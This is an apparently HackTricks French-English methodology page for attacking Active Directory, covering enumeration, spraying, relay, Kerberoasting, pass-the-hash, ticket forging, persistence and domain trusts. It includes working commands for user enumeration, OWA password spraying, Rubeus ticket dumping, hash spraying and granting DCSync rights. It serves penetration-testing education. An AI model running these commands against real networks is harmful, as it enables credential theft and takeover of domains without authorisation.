# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d'un réseau. Il est conçu pour monter en charge, facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure de **Active Directory** se compose de trois couches principales : **domains**, **trees** et **forests**. Un **domain** englobe une collection d'objets, tels que des **users** ou des **devices**, partageant une base de données commune. Les **trees** sont des groupes de ces domaines liés par une structure partagée, et une **forest** représente la collection de plusieurs trees, interconnectés via des **trust relationships**, formant la couche la plus élevée de la structure organisationnelle. Des **access** et des **communication rights** spécifiques peuvent être désignés à chacun de ces niveaux.

Concepts clés au sein de **Active Directory** :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités dans l'annuaire, y compris les **users**, **groups**, ou **shared folders**.
3. **Domain** – Sert de conteneur pour les objets de l'annuaire ; plusieurs domains peuvent coexister au sein d'une **forest**, chacun conservant sa propre collection d'objets.
4. **Tree** – Regroupement de domains partageant un domaine racine commun.
5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs trees avec des **trust relationships** entre eux.

**Active Directory Domain Services (AD DS)** englobe une série de services critiques pour la gestion centralisée et la communication au sein d'un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **users** et les **domains**, y compris l'**authentication** et les fonctionnalités de **search**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion des **digital certificates**.
3. **Lightweight Directory Services** – Prend en charge les applications utilisant l'annuaire via le **LDAP protocol**.
4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les utilisateurs à travers plusieurs applications web en une seule session.
5. **Rights Management** – Aide à protéger le matériel protégé par le droit d'auteur en régulant sa distribution et son utilisation non autorisée.
6. **DNS Service** – Crucial pour la résolution des **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> La communication Kerberos **requiert un nom de domaine entièrement qualifié (FQDN)** pour effectuer des actions. Si vous essayez d'accéder à une machine par son adresse IP, **elle utilisera NTLM et pas Kerberos**.

## Recon Active Directory (No creds/sessions)

Si vous avez uniquement accès à un environnement AD mais que vous n'avez aucune credentials/sessions, vous pouvez :

- **Pentest the network:**
- Scannez le réseau, trouvez des machines et des ports ouverts et essayez d'**exploit vulnerabilities** ou d'**extract credentials** depuis celles-ci (par exemple, [printers could be very interesting targets](ad-information-in-printers.md).
- L'énumération DNS peut fournir des informations sur des serveurs clés du domaine tels que web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour plus d'informations sur la manière de procéder.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions modernes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur la manière d'énumérer un serveur SMB se trouve ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur la façon d'énumérer LDAP se trouve ici (faites **particulièrement attention à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Récupérez des credentials en [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accédez à un hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Récupérez des credentials **exposant** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraire des usernames/noms à partir de documents internes, des réseaux sociaux, des services (principalement web) à l'intérieur des environnements de domaine et aussi à partir de sources publiquement disponibles.
- Si vous trouvez les noms complets des employés, vous pouvez tester différentes conventions de **username AD** (**[read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**)**. Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Lorsqu'un **username invalide est demandé**, le serveur répondra avec le code d'erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui nous permet de déterminer que le username était invalide. Les **valid usernames** déclencheront soit un **TGT in a AS-REP** en réponse soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer une pré-authentification.
- **No Authentication against MS-NRPC**: Utilisation de auth-level = 1 (No authentication) contre l'interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir lié l'interface MS-NRPC pour vérifier si l'utilisateur ou l'ordinateur existe sans aucune credentials. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. La recherche peut être trouvée [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous trouvez l'un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération d'utilisateurs**. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateur dans [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez avoir le **nom des personnes travaillant dans l'entreprise** à partir de l'étape de recon que vous auriez dû effectuer avant ceci. Avec le prénom et le nom de famille, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiels valides.

### Knowing one or several usernames

Ok, donc vous savez que vous avez déjà un nom d'utilisateur valide mais pas de mots de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : Si un utilisateur **n'a pas** l'attribut _DONT_REQ_PREAUTH_ vous pouvez **demander un message AS_REP** pour cet utilisateur qui contiendra des données chiffrées par une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md) : Essayez les mots de passe les plus **communs** sur chacun des utilisateurs découverts, peut-être qu'un utilisateur utilise un mauvais mot de passe (gardez en tête la politique de mot de passe !).
- Notez que vous pouvez aussi **sprayer les serveurs OWA** pour tenter d'accéder aux serveurs mail des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être capable d'**obtenir** des challenges **hashes** à cracker en empoisonnant certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si vous avez réussi à énumérer l'active directory, vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourriez être capable de forcer des attaques de relais NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) pour obtenir l'accès à l'environnement AD.

### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PC ou partages** avec l'**utilisateur null ou guest** vous pourriez **placer des fichiers** (comme un fichier SCF) qui, si ils sont consultés, vont **déclencher une authentification NTLM envers vous** afin que vous puissiez **voler** le **challenge NTLM** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Enumerating Active Directory WITH credentials/session

Pour cette phase vous devez avoir **compromis les identifiants ou une session d'un compte de domaine valide.** Si vous possédez des identifiants valides ou un shell en tant qu'utilisateur de domaine, **rappelez-vous que les options données précédemment restent des possibilités pour compromettre d'autres utilisateurs.**

Avant de commencer l'énumération authentifiée, vous devriez connaître le **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Avoir compromis un compte est une **grande étape pour commencer à compromettre tout le domaine**, car vous allez pouvoir lancer l'**Active Directory Enumeration :**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver tous les utilisateurs potentiellement vulnérables, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les noms d'utilisateur** et essayer le mot de passe du compte compromis, des mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pouvez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus discret
- Vous pouvez aussi [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil incroyable pour la reconnaissance dans un active directory est [**BloodHound**](bloodhound.md). Ce n'est **pas très discret** (selon les méthodes de collecte que vous utilisez), mais **si cela ne vous importe pas**, vous devriez absolument l'essayer. Trouvez où les utilisateurs peuvent RDP, trouvez des chemins vers d'autres groupes, etc.
- **D'autres outils automatisés d'énumération AD sont :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l'annuaire est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi rechercher dans la base LDAP avec **ldapsearch** pour chercher des identifiants dans les champs _userPassword_ & _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés comme :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les noms d'utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Enumeration paraît courte, c'est la partie la plus importante de toutes. Accédez aux liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et pratiquez jusqu'à ce que vous vous sentiez à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider qu'il n'y a rien à faire.

### Kerberoast

Le Kerberoasting consiste à obtenir des **tickets TGS** utilisés par des services liés à des comptes d'utilisateurs et à cracker leur chiffrement — qui est basé sur les mots de passe utilisateurs — **hors ligne**.

Plus d'informations dans :


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu des identifiants, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter sur plusieurs serveurs avec différents protocoles, en fonction de vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des identifiants ou une session en tant qu'utilisateur de domaine régulier et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine du domaine**, vous devriez essayer de trouver un moyen d'**escalader localement les privilèges et de piller les identifiants**. En effet, ce n'est qu'avec des privilèges d'administrateur local que vous pourrez **dumper les hashes d'autres utilisateurs** en mémoire (LSASS) et localement (SAM).

Il y a une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). Aussi, n'oubliez pas d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Il est très **improbable** que vous trouviez des **tickets** dans l'utilisateur courant vous donnant la permission d'accéder à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer l'Active Directory vous aurez **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Recherche de Creds dans les partages d'ordinateurs | SMB Shares

Maintenant que vous avez quelques identifiants de base vous devriez vérifier si vous pouvez **find** any **interesting files being shared inside the AD**. Vous pourriez faire cela manuellement mais c'est une tâche très ennuyeuse et répétitive (et encore plus si vous trouvez des centaines de docs à vérifier).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si vous pouvez **access other PCs or shares** vous pourriez **place files** (comme un fichier SCF) qui, s'ils sont ouverts, vont **trigger an NTLM authentication against you** afin que vous puissiez **steal** the **NTLM challenge** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalade de privilèges sur Active Directory AVEC des identifiants/sessions privilégiés

**Pour les techniques suivantes un utilisateur de domaine standard ne suffit pas, vous avez besoin de certains privilèges/credentials spéciaux pour effectuer ces attaques.**

### Hash extraction

Espérons que vous avez réussi à **compromettre un compte administrateur local** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Ensuite, il est temps de dumper tous les hashes en mémoire et localement.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Vous devez utiliser un **tool** qui **perform** the **NTLM authentication using** that **hash**, **or** vous pouvez créer un nouveau **sessionlogon** et **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** La dernière option est ce que fait mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que cela est assez **bruyant** et que **LAPS** l'**atténuerait**.

### MSSQL Abuse & Trusted Links

Si un utilisateur a les privilèges pour **accéder aux instances MSSQL**, il pourrait les utiliser pour **exécuter des commandes** sur l'hôte MSSQL (si le service tourne en tant que SA), **voler** le **hash** NetNTLM ou même effectuer une **attaque de relay**.\
De plus, si une instance MSSQL est trusted (database link) par une autre instance MSSQL, si l'utilisateur a des privilèges sur la base de données trusted, il pourra **utiliser la relation de trust pour exécuter des requêtes également sur l'autre instance**. Ces trusts peuvent être chaînés et, à un moment donné, l'utilisateur pourrait trouver une base de données mal configurée où il peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent même à travers les forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Les suites tierces d'inventaire et de déploiement exposent souvent des chemins puissants vers des identifiants et l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer ayant l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous disposez de privilèges sur la machine, vous pourrez extraire les TGTs depuis la mémoire de tous les utilisateurs qui se connectent sur l'ordinateur.\
Ainsi, si un **Domain Admin** se connecte sur la machine, vous pourrez extraire son TGT et l'usurper en utilisant [Pass the Ticket](pass-the-ticket.md).\
Grâce à la constrained delegation, vous pourriez même **compromettre automatiquement un Print Server** (espérons que ce soit un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé pour la "Constrained Delegation", il pourra **usurper n'importe quel utilisateur pour accéder à certains services sur une machine**.\
Ensuite, si vous **compromettez le hash** de cet utilisateur/ordinateur, vous pourrez **usurper n'importe quel utilisateur** (même des domain admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avoir le privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'atteindre une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine** qui pourraient vous permettre de **vous déplacer latéralement** ou **d'escalader** les privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

La découverte d'un **service Spool écoutant** dans le domaine peut être **abusée** pour **acquérir de nouveaux identifiants** et **escalader des privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **d'autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants depuis la mémoire** et même **injecter des beacons dans leurs processus** pour les usurper.\
Généralement, les utilisateurs accèdent au système via RDP, voici donc comment effectuer quelques attaques sur les sessions RDP tierces :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système de gestion du **mot de passe Administrateur local** sur les ordinateurs joints au domaine, en s'assurant qu'il est **randomisé**, unique et fréquemment **changé**. Ces mots de passe sont stockés dans Active Directory et l'accès est contrôlé via des ACLs pour les utilisateurs autorisés seulement. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d'autres machines.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

La **récupération de certificats** depuis la machine compromise peut être un moyen d'escalader des privilèges au sein de l'environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **modèles vulnérables** sont configurés, il est possible de les abuser pour escalader des privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Une fois que vous obtenez les privilèges **Domain Admin** ou mieux **Enterprise Admin**, vous pouvez **dumper** la **base de données du domaine** : _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'attaque **Silver Ticket** crée un **TGS légitime** pour un service spécifique en utilisant le **hash NTLM** (par exemple, le **hash du compte PC**). Cette méthode est employée pour **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **Golden Ticket attack** implique qu'un attaquant obtienne le **hash NTLM du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est spécial car il est utilisé pour signer tous les **Ticket Granting Tickets (TGTs)**, qui sont essentiels pour l'authentification au sein du réseau AD.

Une fois que l'attaquant obtient ce hash, il peut créer des **TGTs** pour n'importe quel compte (attaque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ce sont comme des golden tickets forgés d'une manière qui **contourne les mécanismes de détection courants des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posséder les certificats d'un compte ou être capable de les demander** est un très bon moyen de persister sur le compte d'un utilisateur (même s'il change son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Utiliser des certificats permet également de persister avec des privilèges élevés au sein du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une liste standard **Access Control List (ACL)** sur ces groupes pour empêcher les modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL de l'AdminSDHolder pour donner un accès complet à un utilisateur ordinaire, cet utilisateur obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, destinée à protéger, peut donc se retourner contre l'environnement si elle n'est pas surveillée de près.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dans chaque **Domain Controller (DC)** existe un compte **administrateur local**. En obtenant des droits admin sur une telle machine, le hash de l'administrateur local peut être extrait avec **mimikatz**. Ensuite, une modification du registre est nécessaire pour **permettre l'utilisation de ce mot de passe**, autorisant l'accès à distance au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pouvez **donner** des **permissions spéciales** à un **utilisateur** sur certains objets du domaine qui permettront à l'utilisateur **d'escalader des privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** sont utilisés pour **stocker** les **permissions** qu'**un objet** a **sur** un **objet**. Si vous pouvez simplement **faire** un **petit changement** dans le **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altérer **LSASS** en mémoire pour établir un **mot de passe universel**, donnant accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **texte clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin de DA** et d'être à l'intérieur du **root domain**.\
Notez que si vous utilisez de mauvaises données, des logs assez moches apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Précédemment nous avons vu comment escalader des privilèges si vous avez **suffisamment de permissions pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent aussi être utilisés pour **maintenir la persistance**.\
Consultez :


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considère la **Forest** comme la frontière de sécurité. Cela implique que **compromettre un seul domaine pourrait potentiellement conduire à la compromission de toute la Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder à des ressources dans un autre **domaine**. Il crée essentiellement un lien entre les systèmes d'authentification des deux domaines, permettant aux vérifications d'authentification de circuler de façon transparente. Quand des domaines établissent un trust, ils échangent et conservent des **keys** spécifiques au sein de leurs **Domain Controllers (DCs)**, qui sont cruciales pour l'intégrité du trust.

Dans un scénario typique, si un utilisateur souhaite accéder à un service dans un **domaine trusted**, il doit d'abord demander un ticket spécial connu sous le nom de **inter-realm TGT** depuis le DC de son propre domaine. Ce TGT est chiffré avec une **key de trust** partagée entre les deux domaines. L'utilisateur présente ensuite ce TGT au **DC du domaine trusted** pour obtenir un service ticket (**TGS**). Après la validation réussie de l'inter-realm TGT par le DC du domaine trusted, ce dernier délivre un TGS, accordant à l'utilisateur l'accès au service.

**Steps**:

1. Un **client computer** dans **Domain 1** commence le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande ensuite un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources dans **Domain 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre du trust bidirectionnel entre domaines.
5. Le client amène l'inter-realm TGT au **Domain Controller (DC2)** de **Domain 2**.
6. DC2 vérifie l'inter-realm TGT en utilisant sa trust key partagée et, si valide, émet un **Ticket Granting Service (TGS)** pour le serveur de Domain 2 auquel le client veut accéder.
7. Enfin, le client présente ce TGS au serveur, qui est chiffré avec le hash du compte du serveur, pour obtenir l'accès au service dans Domain 2.

### Different trusts

Il est important de noter qu'**un trust peut être unidirectionnel ou bidirectionnel**. Dans l'option à 2 voies, les deux domaines se font mutuellement confiance, mais dans la relation de **1 voie** un des domaines sera le **trusted** et l'autre sera le **trusting**. Dans ce dernier cas, **vous pourrez uniquement accéder aux ressources du domaine trusting depuis le domaine trusted**.

Si le Domain A trust le Domain B, A est le domaine trusting et B est le domaine trusted. De plus, dans **Domain A**, il s'agira d'un **Outbound trust** ; et dans **Domain B**, il s'agira d'un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts** : C'est une configuration commune au sein de la même forest, où un child domain a automatiquement un trust transitive à deux voies avec son parent. Essentiellement, cela signifie que les requêtes d'authentification peuvent circuler sans problème entre le parent et l'enfant.
